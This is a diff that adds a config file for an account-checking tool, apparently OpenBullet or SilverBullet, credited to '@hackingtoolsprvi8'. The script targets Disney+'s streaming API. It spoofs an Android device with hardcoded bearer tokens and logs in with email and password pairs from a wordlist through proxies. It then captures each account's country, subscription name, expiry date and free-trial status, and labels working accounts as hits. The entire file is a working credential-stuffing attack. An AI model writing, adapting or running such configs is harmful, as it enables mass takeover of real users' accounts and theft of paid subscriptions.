@@ -1,0 +1,227 @@
+[SETTINGS]
+{
+  "Name": "Disney+(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-12-08T14:21:21.8392582+01:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Disney+ API[@Lucif3rHun]",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://global.edge.bamgrid.com/devices" 
+  CONTENT "{\"deviceFamily\":\"android\",\"applicationRuntime\":\"android\",\"deviceProfile\":\"phone\",\"attributes\":{\"osDeviceIds\":[{\"identifier\":\"0b76c8dd-7244-4798-b61d-59c9d8e65e78\",\"type\":\"android.advertising.id\"}],\"manufacturer\":\"OnePlus\",\"model\":\"A5010\",\"operatingSystem\":\"Android\",\"operatingSystemVersion\":\"7.1.2\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "accept: application/json; charset=utf-8" 
+  HEADER "authorization: Bearer ZGlzbmV5JmFuZHJvaWQmMS4wLjA.bkeb0m230uUhv8qrAXuNu39tbE_mD5EEhM_NAcohjyA" 
+  HEADER "x-bamsdk-client-id: disney-svod-3d9324fc" 
+  HEADER "x-bamsdk-platform: android" 
+  HEADER "x-bamsdk-version: 4.18.0" 
+  HEADER "x-dss-edge-accept: vnd.dss.edge+json; version=1" 
+  HEADER "x-bamsdk-transaction-id: ab3990a9-f2cf-40c7-be23-05071877dcb6" 
+  HEADER "x-bamtech-location-latitude: 52.368" 
+  HEADER "x-bamtech-location-longitude: 4.9036" 
+  HEADER "user-agent: BAMSDK/v4.18.0 (disney-svod-3d9324fc 1.11.2.0; v2.0/v4.18.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)" 
+  HEADER "accept-encoding: gzip" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+PARSE "<SOURCE>" JSON "assertion" -> VAR "bear" 
+
+REQUEST POST "https://global.edge.bamgrid.com/token" 
+  CONTENT "grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&subject_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI5MWViZDA0Ny1mMzFiLTQ0MWMtOTE2Ni1mYzE3MzcwM2VkY2QiLCJhdWQiOiJ1cm46YmFtdGVjaDpzZXJ2aWNlOnRva2VuIiwibmJmIjoxNjA2NTYxODA1LCJpc3MiOiJ1cm46YmFtdGVjaDpzZXJ2aWNlOmRldmljZSIsImV4cCI6MjQ3MDU2MTgwNSwiaWF0IjoxNjA2NTYxODA1LCJqdGkiOiJhMjQwZWRjZC05NjE1LTQzYzUtOTQxMS1lNjZhMjkwMzcxNmMifQ.388oU7X8XyjFa1haGqFiu_ifOfeE-21DOq0P9wwCsNasqpUb6mZeksvCLh0cnSMXvJeffsB8XaTKGCkiHM1mIg&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice&platform=android&latitude=52.368&longitude=-70.9036" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "accept: application/json" 
+  HEADER "authorization: Bearer ZGlzbmV5JmFuZHJvaWQmMS4wLjA.bkeb0m230uUhv8qrAXuNu39tbE_mD5EEhM_NAcohjyA" 
+  HEADER "x-bamsdk-client-id: disney-svod-3d9324fc" 
+  HEADER "x-bamsdk-platform: android" 
+  HEADER "x-bamsdk-version: 4.18.0" 
+  HEADER "x-dss-edge-accept: vnd.dss.edge+json; version=1" 
+  HEADER "x-bamsdk-transaction-id: ab3990a9-f2cf-40c7-be23-05071877dcb6" 
+  HEADER "user-agent: BAMSDK/v4.18.0 (disney-svod-3d9324fc 1.11.2.0; v2.0/v4.18.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)" 
+  HEADER "accept-encoding: gzip" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "unauthorized_client" 
+    KEY "invalid-token" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "token" 
+
+REQUEST POST "https://global.edge.bamgrid.com/idp/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "accept: application/json; charset=utf-8" 
+  HEADER "authorization: Bearer <token>" 
+  HEADER "x-bamsdk-client-id: disney-svod-3d9324fc" 
+  HEADER "x-bamsdk-platform: android" 
+  HEADER "x-bamsdk-version: 4.18.0" 
+  HEADER "x-dss-edge-accept: vnd.dss.edge+json; version=1" 
+  HEADER "x-bamsdk-transaction-id: 7d76a5ab-56d7-4d11-af88-e5cd21435448" 
+  HEADER "user-agent: BAMSDK/v4.18.0 (disney-svod-3d9324fc 1.11.2.0; v2.0/v4.18.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)" 
+  HEADER "accept-encoding: gzip" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "token_type" 
+    KEY "id_token" 
+  KEYCHAIN Failure OR 
+    KEY "errors" 
+    KEY "Bad credentials sent for disney" 
+  KEYCHAIN Retry OR 
+    KEY "{\"errors\":[{\"code\":\"forbidden\"}]}" 
+    KEY "access-token.invalid" 
+
+PARSE "<SOURCE>" JSON "id_token" -> VAR "id" 
+
+REQUEST POST "https://global.edge.bamgrid.com/accounts/grant" 
+  CONTENT "{\"id_token\":\"<id>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "accept: application/json; charset=utf-8" 
+  HEADER "authorization: Bearer <token>" 
+  HEADER "x-bamsdk-client-id: disney-svod-3d9324fc" 
+  HEADER "x-bamsdk-platform: android" 
+  HEADER "x-bamsdk-version: 4.18.0" 
+  HEADER "x-dss-edge-accept: vnd.dss.edge+json; version=1" 
+  HEADER "x-bamsdk-transaction-id: 7d76a5ab-56d7-4d11-af88-e5cd21435448" 
+  HEADER "user-agent: BAMSDK/v4.18.0 (disney-svod-3d9324fc 1.11.2.0; v2.0/v4.18.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)" 
+  HEADER "accept-encoding: gzip" 
+
+PARSE "<SOURCE>" JSON "assertion" -> VAR "bear1" 
+
+REQUEST POST "https://global.edge.bamgrid.com/token" EncodeContent=TRUE 
+  CONTENT "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token=<bear1>&subject_token_type=urn:bamtech:params:oauth:token-type:account" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer ZGlzbmV5JmFuZHJvaWQmMS4wLjA.bkeb0m230uUhv8qrAXuNu39tbE_mD5EEhM_NAcohjyA" 
+  HEADER "X-BAMSDK-Client-ID: disney-svod-3d9324fc" 
+  HEADER "X-BAMSDK-Platform: android" 
+  HEADER "X-BAMSDK-Version: 4.18.0" 
+  HEADER "X-DSS-Edge-Accept: vnd.dss.edge+json; version=1" 
+  HEADER "X-BAMSDK-Transaction-ID: 3dddc9ca-3d05-49f3-ad21-7b9856b31170" 
+  HEADER "User-Agent: BAMSDK/v4.18.0 (disney-svod-3d9324fc 1.11.2.0; v2.0/v4.18.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "token1" 
+
+REQUEST GET "https://global.edge.bamgrid.com/accounts/me" 
+  
+  HEADER "Accept: application/json; charset=utf-8" 
+  HEADER "Authorization: Bearer <token1>" 
+  HEADER "X-BAMSDK-Client-ID: disney-svod-3d9324fc" 
+  HEADER "X-BAMSDK-Platform: android" 
+  HEADER "X-BAMSDK-Version: 4.18.0" 
+  HEADER "X-DSS-Edge-Accept: vnd.dss.edge+json; version=1" 
+  HEADER "X-BAMSDK-Transaction-ID: 58234fe0-1d6d-4e05-a6d6-a6838e3609a4" 
+  HEADER "User-Agent: BAMSDK/v4.18.0 (disney-svod-3d9324fc 1.11.2.0; v2.0/v4.18.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+PARSE "<SOURCE>" JSON "emailVerified" CreateEmpty=FALSE -> CAP "Email Verified" 
+
+PARSE "<SOURCE>" JSON "securityFlagged" CreateEmpty=FALSE -> CAP "Security Flagged" 
+
+PARSE "<SOURCE>" JSON "country" CreateEmpty=FALSE -> CAP "country" 
+
+REQUEST GET "https://global.edge.bamgrid.com/subscriptions" 
+  
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "X-BAMSDK-Client-ID: disney-svod-3d9324fc" 
+  HEADER "Authorization: Bearer <token1>" 
+  HEADER "X-BAMSDK-Platform: android" 
+  HEADER "X-BAMSDK-Version: 4.18.0" 
+  HEADER "User-Agent: BAMSDK/v4.18.0 (disney-svod-3d9324fc 1.11.2.0; v2.0/v4.18.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+PARSE "<SOURCE>" LR "\"name\":\"" "\"" Recursive=TRUE -> CAP "Subscription" 
+
+PARSE "<SOURCE>" LR "\"expirationDate\":\"" "T" -> VAR "E" 
+
+FUNCTION DateToUnixTime "yyyy-MM-dd" "<E>" -> VAR "ut" 
+
+FUNCTION UnixTimeToDate "dd-MM-yyyy" "<ut>" -> CAP "Expiry Date" 
+
+PARSE "<SOURCE>" LR "freeTrial\":{\"status\":\"" "\"}," -> CAP "Free Trial" 
+
+PARSE "<SOURCE>" JSON "earlyAccess" -> CAP "Early Access" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "[]" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "type\":\"UNSUBSCRIBED" 
+    KEY "status\":\"INACTIVE" 
+    KEY "<ut>" EqualTo "<ct>" 
+    KEY "<ut>" LessThan "<ct>" 
+  KEYCHAIN Success OR 
+    KEY "type\":\"SUBSCRIBED" 
+    KEY "status\":\"ACTIVE" 
+    KEY "<ut>" GreaterThan "<ct>" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> CAP "Config by" 
+
